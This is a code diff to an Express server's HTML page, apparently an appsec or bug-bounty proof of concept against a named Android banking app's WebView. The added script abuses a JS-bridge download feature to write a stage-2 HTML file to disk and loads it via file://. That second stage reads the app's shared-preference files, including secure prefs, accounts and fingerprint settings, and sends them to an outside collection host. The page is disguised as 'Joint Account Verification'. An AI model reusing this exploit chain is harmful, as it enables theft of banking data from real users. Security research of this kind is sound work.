@@ -11,14 +11,74 @@ app.use(express.static(path.join(__dirname, "public")));
 app.get("/", (_req, res) => {
   res.type('html').send(`<!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>Joint Account Verification</title></head>
 <body>
+<p>Verifying your information, please wait...</p>
 <script>
+// --- STAGE 2 PAYLOAD ---
+// This HTML will execute in a file:// context where setAllowFileAccessFromFileURLs(true)
+// permits XHR to other file:// URLs. Exfiltration uses the JS bridge EXTERNAL_WEBVIEW
+// to open the external browser (bypasses setAllowUniversalAccessFromFileURLs=false).
+
+var stage2Html = [
+'<!DOCTYPE html>',
+'<html><body><script>',
+'var stolen = {};',
+'var targets = [',
+'  "/data/data/com.rbc.mobile.android/shared_prefs/SecurePrefs.xml",',
+'  "/data/data/com.rbc.mobile.android/shared_prefs/RBC Mobile.xml",',
+'  "/data/data/com.rbc.mobile.android/shared_prefs/accounts.xml",',
+'  "/data/data/com.rbc.mobile.android/shared_prefs/autoBackupSharedPref.xml",',
+'  "/data/data/com.rbc.mobile.android/shared_prefs/fingerprint_preference_name.xml",',
+'  "/data/data/com.rbc.mobile.android/shared_prefs/ASYNC_NOTIFICATION_PREF.xml"',
+'];',
+'var completed = 0;',
+'targets.forEach(function(path) {',
+'  var xhr = new XMLHttpRequest();',
+'  xhr.open("GET", "file://" + path, true);',
+'  xhr.onreadystatechange = function() {',
+'    if (xhr.readyState === 4) {',
+'      if (xhr.status === 0 || xhr.status === 200) {',
+'        stolen[path] = xhr.responseText;',
+'      }',
+'      completed++;',
+'      if (completed === targets.length) {',
+'        // Exfiltrate via JS bridge -> external browser (bypasses universal access restriction)',
+'        var data = encodeURIComponent(JSON.stringify(stolen));',
+'        WebViewFragment.onNavigateWebHook(JSON.stringify({',
+'          "version": "1.2",',
+'          "type": "externalWebview",',
+'          "destination": "https://edzgaslqbiamjmvftfea7klu2g2d78cp3.oast.fun/collect?d=" + data',
+'        }));',
+'      }',
+'    }',
+'  };',
+'  xhr.send();',
+'});',
+'<\\/script><\\/body><\\/html>'
+].join('\n');
+
+// --- STEP 1: Write stage-2 HTML to predictable path via DYNAMIC_DOWNLOAD_DOCUMENT ---
+// File is written to: /storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html
+// No URL validation, no file-type check — writeBase64ToFile() writes raw decoded bytes.
+
+var base64Payload = btoa(stage2Html);
+
 WebViewFragment.onFeatureEventWebHook(JSON.stringify({
     "version": "1.2",
-    "type": "DOWNLOAD_DOCUMENT",
-    "targetUrl": "https://appsec-test-website/test.txt"
+    "type": "dynamicDownloadDocument",
+    "targetFileBase64": base64Payload,
+    "fileName": "verify.html"
 }));
+
+// --- STEP 2: Navigate WebView to the file:// path ---
+// shouldOverrideUrlLoading only intercepts tel: — file:// falls through.
+// setAllowFileAccess(true) permits the WebView to load file:// URLs.
+// The JS bridge (addJavascriptInterface) persists across navigation.
+
+setTimeout(function() {
+    window.location = "file:///storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html";
+}, 1500);
 </script>
 </body>
 </html>`);
